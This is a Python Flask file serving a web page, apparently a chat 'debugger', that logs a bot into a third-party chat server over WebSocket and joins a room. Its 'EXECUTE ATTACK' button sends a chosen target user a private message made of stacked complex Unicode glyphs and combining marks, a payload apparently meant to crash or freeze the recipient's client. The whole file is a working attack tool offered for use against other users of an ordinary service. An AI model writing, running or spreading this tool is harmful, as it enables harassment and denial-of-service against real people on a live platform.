import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN STEALTH DEBUGGER</title>
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #020202; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; }
        
        /* Input Panel */
        .top-nav { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 8px; border-radius: 4px; width: 140px; }
        button { padding: 8px 20px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); }
        button:hover { background: var(--neon); color: #000; }
        .atk-btn { border-color: var(--danger); color: var(--danger); }

        /* Full Height Debug Terminal */
        .terminal-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #000; }
        .term-header { background: #1a1a1a; padding: 5px 15px; font-size: 11px; color: #666; display: flex; justify-content: space-between; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; line-height: 1.4; scroll-behavior: smooth; }
        
        /* Log Colors */
        .line { margin-bottom: 6px; border-left: 2px solid #222; padding-left: 10px; word-break: break-all; }
        .in { color: var(--term); border-color: var(--term); }
        .out { color: var(--neon); border-color: var(--neon); }
        .err { color: var(--danger); border-color: var(--danger); }
        .payload-raw { background: #080808; padding: 5px; margin-top: 2px; color: #00ccff; font-size: 11px; border: 1px solid #111; display: block; }
    </style>
</head>
<body>
    <div class="top-nav">
        <input type="text" id="user" placeholder="Bot User">
        <input type="password" id="pass" placeholder="Bot Pass">
        <input type="text" id="room" placeholder="Room Name">
        <input type="text" id="target" placeholder="Target Username">
        <button onclick="connect()">LOGIN</button>
        <button class="atk-btn" onclick="fireAttack()">EXECUTE ATTACK</button>
        <button onclick="document.getElementById('terminal').innerHTML=''" style="border-color:#444; color:#444">CLEAR</button>
    </div>

    <div class="terminal-container">
        <div class="term-header">
            <span>TERMINAL_RECV_FEED [RAW_JSON_MONITOR]</span>
            <span id="st">STATUS: OFFLINE</span>
        </div>
        <div id="terminal" class="terminal-body"></div>
    </div>

    <script>
        let ws;
        const terminal = document.getElementById('terminal');

        function log(msg, type='sys', raw=null) {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            let h = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(raw) h += `<span class="payload-raw">${JSON.stringify(raw, null, 2)}</span>`;
            div.innerHTML = h;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function connect() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            ws = new WebSocket("wss://chatp.net:5333/server");

            ws.onopen = () => {
                document.getElementById('st').innerText = "STATUS: ONLINE";
                document.getElementById('st').style.color = "var(--term)";
                const logReq = {handler:"login", id: Math.random(), username: u, password: p};
                ws.send(JSON.stringify(logReq));
                log("SENT LOGIN_REQUEST", "out", logReq);
                setInterval(() => { if(ws.readyState===1) ws.send(JSON.stringify({handler:"ping"})); }, 25000);
            };

            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                log("RECEIVED_PAYLOAD", "in", data);

                if(data.handler === "login_event" && data.type === "success") {
                    const r = document.getElementById('room').value;
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: r}));
                }
            };

            ws.onclose = () => { document.getElementById('st').innerText = "STATUS: OFFLINE"; };
        }

        function fireAttack() {
            const t = document.getElementById('target').value;
            if(!ws || ws.readyState !== 1) return log("Error: Not Connected", "err");

            // Clever Payload Sequence
            const stress = "జ్ఞा" + " ҉ ".repeat(15) + "ဪ".repeat(5);
            const pkt = {
                handler: "chat_message",
                to: t,
                type: "text",
                body: stress,
                is_private: true
            };
            ws.send(JSON.stringify(pkt));
            log("ATTACK_FIRED >> " + t, "out", pkt);
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
